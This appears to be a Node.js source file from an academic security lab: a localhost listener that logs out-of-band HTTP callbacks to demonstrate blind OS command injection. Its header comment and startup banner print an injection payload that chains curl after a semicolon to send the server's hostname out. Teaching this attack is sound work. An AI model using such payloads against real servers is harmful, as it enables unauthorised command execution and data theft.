/**
 * ============================================================================
 * OOB LISTENER — Blind OS Command Injection (Variant 2B) Demonstration Tool
 * ============================================================================
 *
 * Subject : Web Server Security — Academic Cyber Security Lab
 * Purpose : Out-of-Band (OOB) callback listener for demonstrating Blind OS
 *           Command Injection via a separate communication channel.
 *
 * Usage:
 *   node oob-listener.js
 *   — or —
 *   npm run listener
 *
 * HOW IT WORKS:
 *   1. Start this listener in a SEPARATE terminal before the demonstration.
 *   2. Start the main web app in its own terminal (node server.js or npm run lab).
 *   3. In the browser (http://127.0.0.1:3000), navigate to the
 *      "Out-of-Band Blind Injection" section (Variant 2B).
 *   4. Submit the exploit payload:
 *        127.0.0.1; curl http://127.0.0.1:4445/?victim=$(hostname)
 *   5. The browser receives only the generic server response.
 *   6. THIS terminal receives and logs the out-of-band HTTP callback,
 *      proving command execution without any in-band evidence.
 *
 * LOCALHOST RESTRICTION:
 *   Binds exclusively to 127.0.0.1. No external network exposure.
 *
 * DEPENDENCIES: None. Uses Node.js built-in 'http' module only.
 * ============================================================================
 */

'use strict';

const http = require('http');

const LISTENER_HOST = '127.0.0.1';
const LISTENER_PORT = 4445;

let callbackCount = 0;

// ============================================================================
// Request Handler
// ============================================================================
const server = http.createServer((req, res) => {
  callbackCount++;

  const timestamp = new Date().toISOString();
  const sourceIp   = req.socket.remoteAddress || 'unknown';
  const userAgent  = req.headers['user-agent'] || '(none)';

  // Parse URL and query parameters safely
  let parsedPath   = '/';
  let queryParams  = {};
  try {
    const fullUrl  = new URL(req.url, `http://${LISTENER_HOST}:${LISTENER_PORT}`);
    parsedPath     = fullUrl.pathname;
    queryParams    = Object.fromEntries(fullUrl.searchParams.entries());
  } catch (_) {
    parsedPath = req.url;
  }

  // --------------------------------------------------------------------------
  // Print prominent callback notification to terminal
  // --------------------------------------------------------------------------
  console.log('\n' + '!'.repeat(70));
  console.log(`  [OOB CALLBACK RECEIVED]  #${callbackCount}`);
  console.log('!'.repeat(70));
  console.log(`  Timestamp     : ${timestamp}`);
  console.log(`  Source IP     : ${sourceIp}`);
  console.log(`  Method        : ${req.method}`);
  console.log(`  Path          : ${parsedPath}`);
  console.log(`  Query Params  : ${JSON.stringify(queryParams)}`);
  console.log(`  User-Agent    : ${userAgent}`);
  console.log('  ' + '-'.repeat(66));
  console.log('  INTERPRETATION:');
  console.log('  The web server process executed an injected OS command via');
  console.log('  child_process.exec() with shell metacharacter parsing.');
  console.log('  The injected command caused curl to make this HTTP request');
  console.log('  as a SEPARATE out-of-band channel.');
  console.log('  The original browser HTTP response contained NO evidence');
  console.log('  of this callback — confirming Blind OS Command Injection.');
  if (queryParams.victim) {
    console.log('  ' + '-'.repeat(66));
    console.log(`  EXFILTRATED DATA  : victim=$(hostname) resolved to "${queryParams.victim}"`);
    console.log('  This is the hostname of the machine running the web server,');
    console.log('  evaluated by the shell before curl was invoked.');
  }
  console.log('!'.repeat(70) + '\n');

  // Respond 200 OK so curl exits with code 0 (no retry noise)
  res.writeHead(200, {
    'Content-Type': 'text/plain',
    'Connection': 'close'
  });
  res.end('OK\n');
});

// ============================================================================
// Error Handling
// ============================================================================
server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`\n[ERROR] Port ${LISTENER_PORT} is already in use on ${LISTENER_HOST}.`);
    console.error(`        Find the process: lsof -i :${LISTENER_PORT}`);
    console.error(`        Kill it:          kill -9 <PID>\n`);
  } else {
    console.error('[ERROR] OOB Listener encountered an error:', err.message);
  }
  process.exit(1);
});

// ============================================================================
// Startup
// ============================================================================
server.listen(LISTENER_PORT, LISTENER_HOST, () => {
  console.log('\n' + '='.repeat(70));
  console.log('  OOB LISTENER — Blind OS Command Injection (Variant 2B)');
  console.log('  Academic Cyber Security Lab Demonstration Tool');
  console.log('='.repeat(70));
  console.log(`  Listening on  : http://${LISTENER_HOST}:${LISTENER_PORT}`);
  console.log('  Binding       : STRICT LOCALHOST ONLY (127.0.0.1)');
  console.log('  Status        : Waiting for out-of-band callbacks...');
  console.log('-'.repeat(70));
  console.log('  EXPLOIT PAYLOAD TO SUBMIT IN THE BROWSER:');
  console.log('  127.0.0.1; curl http://127.0.0.1:4445/?victim=$(hostname)');
  console.log('');
  console.log('  STEPS:');
  console.log('  1. Keep THIS terminal open and visible.');
  console.log('  2. Open http://127.0.0.1:3000 in a browser.');
  console.log('  3. Scroll to "Out-of-Band Blind Injection" (Variant 2B).');
  console.log('  4. Click the exploit preset button or type the payload above.');
  console.log('  5. Click "Send Request" — watch THIS terminal for the callback.');
  console.log('  6. The browser will show only the generic server response.');
  console.log('-'.repeat(70));
  console.log('  Press Ctrl+C to stop.');
  console.log('='.repeat(70) + '\n');
});
